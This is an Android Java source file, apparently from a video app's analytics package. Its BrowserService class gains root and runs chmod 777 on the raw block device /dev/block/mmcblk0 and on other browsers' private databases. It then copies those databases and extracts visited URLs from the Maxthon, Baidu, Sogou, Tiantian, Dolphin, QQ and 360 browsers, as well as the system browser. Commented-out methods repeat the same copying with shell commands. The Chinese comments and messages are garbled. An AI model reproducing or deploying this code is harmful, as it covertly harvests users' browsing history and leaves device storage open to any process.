package tv.pps.bi.proto.biz;


import java.util.ArrayList;

import tv.pps.bi.utils.Utils;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.Browser;
import android.widget.Toast;

public class BrowserService {

	
//	public List<URLActivity> getFirefoxBrowserURL()//��ȡ������ݿ���Ϣ
//	{
//		String[] cmdStr = new String[1];
//		String chmod ="chmod 777 /data/data/org.mozilla.firefox/files/mozilla";
//		cmdStr[0] = chmod;
//		RootUtils.executeShell(cmdStr);
//		FileUtils.refreshFileList("/data/data/org.mozilla.firefox/files/mozilla");
//        String filePath = FileUtils.getFilelist().get(0);
//		if(filePath!=null)
//		{
//			Log.i("jiangqq", "�洢���ݿ�ĵ��ļ��е�·��Ϊ��"+filePath);
//			//�����޸����ݿ�
//			String  db_chmod="chmod 777 "+filePath+"/browser.db";
//            String  db_cat="cat "+filePath+"/browser.db"+" > /data/data/org.mozilla.firefox/pps_browser.db";
//            String  db_mv="mv /data/data/org.mozilla.firefox/pps_browser.db /data/data/com.pps.bi.activity/databases/pps_browser.db";
//            Log.i("jiangqq", "·��Ϊ:"+db_chmod);
//            Log.i("jiangqq", "·��Ϊ:"+db_cat);
//            Log.i("jiangqq", "·��Ϊ:"+db_mv);
//            String[] dbcmd=new String[3];
//            dbcmd[0]=db_chmod;
//            dbcmd[1]=db_cat;
//            dbcmd[2]=db_mv;
//            return extracted(dbcmd,"pps_browser.db","history");
//		}
//		return null;
//	}
	
	

	public ArrayList<String> getAoyouBrowserData(Context context) {// ��ȡ�������������
		String thirdpartyDBName = "mxbrowser_default.db";
		String thirdpartyDBPath = "/data/data/com.mx.browser/databases/mxbrowser_default.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/mxbrowser_default.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
	
	
	/**
	 * ��ȡ�ٶ�������ķ��ʵ���ʷ��¼(BaiDu)
	 * 
	 * @return ������ʷ��¼�ļ���
	 */
//	public List<URLActivity> getBaiduBrowserURL(Context context) {
//		String chmod = "chmod 777 /data/data/com.baidu.browser.apps/databases/dbbrowser.db";
//		String cat_cmd = "cat /data/data/com.baidu.browser.apps/databases/dbbrowser.db > /data/data/com.baidu.browser.apps/databases/pps_dbbrowser.db";
//		String mv_cmd = "mv /data/data/com.baidu.browser.apps/databases/pps_dbbrowser.db /data/data/com.pps.bi.activity/databases/pps_dbbrowser.db";
//		String[] cmdStr = new String[3];
//		cmdStr[0] = chmod;
//		cmdStr[1] = cat_cmd;
//		cmdStr[2] = mv_cmd;
//		return extracted(cmdStr,"pps_dbbrowser.db","history",context);
//	}

	public ArrayList<String> getBaiduBrowserData(Context context) {// ��ȡ�ٶ����������
		String thirdpartyDBName = "dbbrowser.db";
		String thirdpartyDBPath = "/data/data/com.baidu.browser.apps/databases/dbbrowser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/dbbrowser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
	/**
	 * ��ѯ�ѹ�������ķ��ʼ�¼
	 * @return
	 */
	public ArrayList<String> getSoGouBrowserData(Context context) {// ��ȡ�ѹ����������
		String thirdpartyDBName = "sogou_mobile_browser.db";
		String thirdpartyDBPath = "/data/data/sogou.mobile.explorer/databases/sogou_mobile_browser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/sogou_mobile_browser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
//	public List<URLActivity> getSoGouBrowserURL(Context context) {
//		String chmod = "chmod 777 /data/data/sogou.mobile.explorer/databases/sogou_mobile_browser.db";
//		String cmd = "cat /data/data/sogou.mobile.explorer/databases/sogou_mobile_browser.db > /data/data/sogou.mobile.explorer/databases/pps_sogou_mobile_browser.db";
//		String mv_Cmd = "mv /data/data/sogou.mobile.explorer/databases/pps_sogou_mobile_browser.db /data/data/com.pps.bi.activity/databases/pps_sogou_mobile_browser.db";
//		String[] cmdStr = new String[3];
//		cmdStr[0] = chmod;
//		cmdStr[1] = cmd;
//		cmdStr[2] = mv_Cmd;
//		return extracted(cmdStr,"pps_sogou_mobile_browser.db","history",context);
//	}
    
	
	/**
	 * ��ѯ�������������ʷ���ʼ�¼
	 * @return
	 */
	public ArrayList<String> getSkyBrowserData(Context context) {// ��ȡ�������������
		String thirdpartyDBName = "HWBrowser.db";
		String thirdpartyDBPath = "/data/data/com.tiantianmini.android.browser/databases/HWBrowser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/HWBrowser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("TB_History", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
//	public List<URLActivity> getSkyBrowserURL(Context context)
//	{
//		String chmod = "chmod 777 /data/data/com.tiantianmini.android.browser/databases/HWBrowser.db";
//		String cmd = "cat /data/data/com.tiantianmini.android.browser/databases/HWBrowser.db > /data/data/com.tiantianmini.android.browser/databases/pps_HWBrowser.db";
//		String mv_Cmd = "mv /data/data/com.tiantianmini.android.browser/databases/pps_HWBrowser.db /data/data/com.pps.bi.activity/databases/pps_HWBrowser.db";
//		String[] cmdStr = new String[3];
//		cmdStr[0] = chmod;
//		cmdStr[1] = cmd;
//		cmdStr[2] = mv_Cmd;
//		return extracted(cmdStr,"pps_HWBrowser.db","TB_History",context);
//	}
//
//	/**
//	 * ��ѯ������������ʷ���ʼ�¼
//	 * @return
//	 */
//	public List<URLActivity> getFirefoxBrowserURL()
//	{
//		
//		return null;
//	}
	
//	/**
//	 * ��ȡ��ʷ���ʼ�¼
//	 * @param cmdStr
//	 * @return
//	 */
//	private List<URLActivity> extracted(String[] cmdStr,String datebaseName ,String tableName,Context mContext) {
//		Utils.executeShell(cmdStr);
//		SQLiteDatabase mDatabase = mContext.openOrCreateDatabase(
//				datebaseName, 0, null);
//		Cursor mCursor = mDatabase.query(tableName, new String[] { "title",
//				"url" }, null, null, null, null, null);
//		if (mCursor != null && mCursor.getCount() >= 0) {
//			List<URLActivity> mUrlActivities = new ArrayList<URLActivity>(
//					mCursor.getCount());
//			while (mCursor.moveToNext()) {
//				URLActivity urlActivity = new URLActivity();
//				urlActivity.setTitle(mCursor.getString(mCursor
//						.getColumnIndex("title")));
//				urlActivity.setUrl(mCursor.getString(mCursor
//						.getColumnIndex("url")));
//				mUrlActivities.add(urlActivity);
//			}
//			if (mCursor != null) {
//				mCursor.close();
//			}
//			if (mDatabase != null) {
//				mDatabase.close();
//			}
//			return mUrlActivities;
//		}
//		return null;
//	}
	
	

	public ArrayList<String> getDolphinData(Context context) {// ��ȡ�������������
		String thirdpartyDBName = "browser.db";
		String thirdpartyDBPath = "/data/data/com.dolphin.browser.xf/databases/browser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/browser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
	
	public ArrayList<String> getQQData(Context context) {// ��ȡQQ���������
		String thirdpartyDBName = "database";
		String thirdpartyDBPath = "/data/data/com.tencent.mtt/databases/database";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/database";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("URL")));
		}
		return list;
		}
		else{
			return null;
		}
		
	}
	
	
	
	public boolean getQihooRoot(Context context) {// ��ȡ360��������ݿ�Ȩ��
		String thirdpartyDBName = "browser.db";
		String thirdpartyDBPath = "/data/data/com.qihoo.browser/databases/browser.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}
	public ArrayList<String> getQihooData(Context context) {// ��ȡ360���������
		String databaseFilename = context.getFilesDir() + "/browser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
	}

	public boolean getVideoPackageRoot(Context context,
			String thirdpartyDBName, String thirdpartyDBPath) {
		// �޸����ݿ����Լ����µ�����
		String dbname = thirdpartyDBName;
		String rootCmd = "chmod 777 /dev/block/mmcblk0";// ����rootȨ��
		String fromDB = thirdpartyDBPath;
		String toMyDB = context.getFilesDir().toString() + "/" + thirdpartyDBName;
		String modifyCmd = "chmod 777 " + fromDB;
		String copyCmd = "cat " + fromDB + "  > " + toMyDB;
		if (Utils.execRootCmd(rootCmd)) {
			Toast.makeText(context, "root�ɹ�", 1).show();
			if (Utils.execRootCmd(modifyCmd)) {
				Toast.makeText(context, "�޸�" + dbname + "��дȨ�޳ɹ�", 1).show();
				if (Utils.execRootCmd(copyCmd))
					Toast.makeText(context,
							"����" + dbname + "��" + toMyDB + "�ɹ�", 1).show();
				else {
					Toast.makeText(context,
							"����" + dbname + "��" + toMyDB + "ʧ��", 1).show();
					return false;
					
				}
			} else {
				Toast.makeText(context, "�޸�" + dbname + "��дȨ��ʧ��", 1).show();
				return false;
			}
		} else {
			Toast.makeText(context, "rootʧ��", 1).show();
			return false;
		}
		return true;
	}
	
	
	

	public ArrayList<String> getSystemBrowserUrl(Context context) {//��ȡϵͳ�������URL
		ContentResolver resolver = context.getContentResolver();
		ArrayList<String> list = new ArrayList<String>();
		Cursor cursor = null;
		try {
			cursor = Browser.getAllVisitedUrls(resolver);
			while (cursor.moveToNext()) {
				list.add(cursor.getString(cursor
						.getColumnIndex(Browser.BookmarkColumns.URL)));
			}
		} catch (Exception e) {
                   e.printStackTrace();
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}
		return list;

	}

}
